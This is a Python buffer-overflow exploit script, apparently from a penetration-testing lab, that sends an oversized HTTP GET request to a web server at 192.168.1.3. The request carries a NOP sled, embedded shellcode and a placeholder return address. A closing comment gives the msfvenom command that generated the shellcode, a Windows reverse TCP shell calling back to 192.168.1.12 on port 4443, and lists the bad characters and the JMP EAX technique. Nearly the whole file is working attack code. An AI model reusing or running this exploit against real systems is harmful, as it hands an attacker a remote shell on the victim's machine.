#!/usr/bin/env python

import socket, time, sys

ip = "192.168.1.3"

port = 80
timeout = 5

shellcode = ("\xbd\xa3\x26\xb5\x14\xdb\xc4\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x6a\x12\x83\xea\xfc\x03\xc9\x28\x57\xe1\xf1"
"\xdd\x15\x0a\x09\x1e\x7a\x82\xec\x2f\xba\xf0\x65\x1f\x0a"
"\x72\x2b\xac\xe1\xd6\xdf\x27\x87\xfe\xd0\x80\x22\xd9\xdf"
"\x11\x1e\x19\x7e\x92\x5d\x4e\xa0\xab\xad\x83\xa1\xec\xd0"
"\x6e\xf3\xa5\x9f\xdd\xe3\xc2\xea\xdd\x88\x99\xfb\x65\x6d"
"\x69\xfd\x44\x20\xe1\xa4\x46\xc3\x26\xdd\xce\xdb\x2b\xd8"
"\x99\x50\x9f\x96\x1b\xb0\xd1\x57\xb7\xfd\xdd\xa5\xc9\x3a"
"\xd9\x55\xbc\x32\x19\xeb\xc7\x81\x63\x37\x4d\x11\xc3\xbc"
"\xf5\xfd\xf5\x11\x63\x76\xf9\xde\xe7\xd0\x1e\xe0\x24\x6b"
"\x1a\x69\xcb\xbb\xaa\x29\xe8\x1f\xf6\xea\x91\x06\x52\x5c"
"\xad\x58\x3d\x01\x0b\x13\xd0\x56\x26\x7e\xbd\x9b\x0b\x80"
"\x3d\xb4\x1c\xf3\x0f\x1b\xb7\x9b\x23\xd4\x11\x5c\x43\xcf"
"\xe6\xf2\xba\xf0\x16\xdb\x78\xa4\x46\x73\xa8\xc5\x0c\x83"
"\x55\x10\x82\xd3\xf9\xcb\x63\x83\xb9\xbb\x0b\xc9\x35\xe3"
"\x2c\xf2\x9f\x8c\xc7\x09\x48\x73\xbf\x10\x84\x1b\xc2\x12"
"\x85\x80\x4b\xf4\xcf\x26\x1a\xaf\x67\xde\x07\x3b\x19\x1f"
"\x92\x46\x19\xab\x11\xb7\xd4\x5c\x5f\xab\x81\xac\x2a\x91"
"\x04\xb2\x80\xbd\xcb\x21\x4f\x3d\x85\x59\xd8\x6a\xc2\xac"
"\x11\xfe\xfe\x97\x8b\x1c\x03\x41\xf3\xa4\xd8\xb2\xfa\x25"
"\xac\x8f\xd8\x35\x68\x0f\x65\x61\x24\x46\x33\xdf\x82\x30"
"\xf5\x89\x5c\xee\x5f\x5d\x18\xdc\x5f\x1b\x25\x09\x16\xc3"
"\x94\xe4\x6f\xfc\x19\x61\x78\x85\x47\x11\x87\x5c\xcc\x21"
"\xc2\xfc\x65\xaa\x8b\x95\x37\xb7\x2b\x40\x7b\xce\xaf\x60"
"\x04\x35\xaf\x01\x01\x71\x77\xfa\x7b\xea\x12\xfc\x28\x0b"
"\x37")	


prefix = "GET "

buffer = prefix + "\x90" * 16

buffer += shellcode

buffer += "\x90" *(1787 - len(buffer) + len(prefix))


# buffer += "\x53\x93\x42\x7E"
buffer += "BBBB"

buffer += "\x90" * 24

buffer += shellcode

buffer += "C" * 100

suffix = " HTTP/1.1\r\n\r\n"


try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(timeout)
		s.connect((ip, port))
		buffer += suffix
		print("Fuzzing with {} bytes".format(len(buffer) - len(prefix)))
		s.send(bytes(buffer,  "latin-1"))
except:
	print("The error connect the server is: ")
	print("Fuzzing crashed at {} bytes".format(len(buffer) - len(prefix)))
	sys.exit(0)
	

"""
Result:
	input :
		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.12 LPORT=4443 EXITFUNC=thread -f c -a x86 -b "\x00\x0d"

		
	Used : JMP EAX
	bad char
	\x00\x0d

"""


